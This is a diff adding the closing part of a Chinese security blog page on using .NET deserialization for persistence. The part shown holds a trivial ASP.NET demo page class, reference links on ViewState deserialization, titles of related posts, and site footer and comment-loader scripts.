+<span class="k">using</span> <span class="nn">System.Web.UI</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web.UI.WebControls</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text.RegularExpressions</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+<span class="k">public</span> <span class="k">partial</span> <span class="k">class</span> <span class="nc">hello</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">UI</span><span class="p">.</span><span class="n">Page</span>
+<span class="p">{</span>
+    <span class="k">protected</span> <span class="k">void</span> <span class="n">Page_Load</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="p">}</span>
+    <span class="k">protected</span> <span class="k">override</span> <span class="k">void</span> <span class="n">OnInit</span><span class="p">(</span><span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">base</span><span class="p">.</span><span class="n">OnInit</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="k">protected</span> <span class="k">void</span> <span class="n">Button1_Click</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="n">TextArea1</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li>
+<p><a href="https://www.4hou.com/posts/GYq7" target="_blank" rel="noopener">如何借助ViewState在ASP.NET中实现反序列化漏洞利用</a></p>
+</li>
+<li>
+<p><a href="https://zhuanlan.zhihu.com/p/365126612" target="_blank" rel="noopener">深入 .NET ViewState 反序列化及其利用</a></p>
+</li>
+</ol>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" target="_blank" rel="noopener">https://myzxcg.com/2021/11/利用.NET-反序列化做权限维持/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" class="related-link">域委派利用</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/09/%E5%9F%9F%E7%94%A8%E6%88%B7%E5%8F%A3%E4%BB%A4%E7%AD%96%E7%95%A5%E4%B8%8E%E6%9A%B4%E7%A0%B4/" class="related-link">域用户口令策略与暴破</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="related-link">组策略利用与横向移动</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/08/%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA%E5%99%A8%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" class="related-link">域用户与域成员机器关系及利用</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/08/Windows%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B-ACL%E5%88%86%E6%9E%90/" class="related-link">Windows访问控制模型--ACL分析</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+
+
+        
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Windows/" rel="tag" class="post-tag-link">#windows</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+            
+                <li class="post-nav-next">
+                    <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" rel="next">Spring 内存马实现 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+            <div id="vcomments"></div>
+        
+
+        
+
+        
+    
+
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+
+            
+    
+        <ul class="socials"><li class="socials-item">
+                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
+                </li></ul>
+    
+
+
+            <div class="site-info">©&nbsp;2021&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+              </div>
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+    
+
+        
+
+        
+            <script>
+    function loadComments() {
+        if (typeof Valine === 'undefined') {
+            var getScript = (options) => {
+                var script = document.createElement('script');
+                script.defer = true;
+                script.crossOrigin = 'anonymous';
+                Object.keys(options).forEach((key) => {
+                    script[key] = options[key];
+                });
+                document.body.appendChild(script);
+            };
+            getScript({
+                src: '//unpkg.com/valine@latest/dist/Valine.min.js',
+                onload: () => {
+                    newValine();
+                }
+            });
+        } else {
+            newValine();
+        }
+    }
+    function newValine() {
+        new Valine({
+            el: '#vcomments',
+            appId: '6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI',
+            appKey: '0GcKEskKSnNfqn5dbNITfO4H',
+            placeholder: '有问题欢迎交流',
+            path: location.pathname,
+            avatar: 'mp',
+            meta: ["nick","mail","link"],
+            pageSize:  10 ,
+            lang: 'zh-cn',
+            visitor:  false ,
+            highlight:  true ,
+            avatarForce:  false ,
+            recordIP:  true ,
+            serverURLs: '',
+            emojiCDN: '',
+            emojiMaps: {},
+            enableQQ:  false ,
+            requiredFields: []
+        });
+    }
+</script>
+
+        
+
+        
+
+        
+
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    let imgNodes = document.querySelectorAll('div.post-body img');
+    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");
+
+    mediumZoom(imgNodes, {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
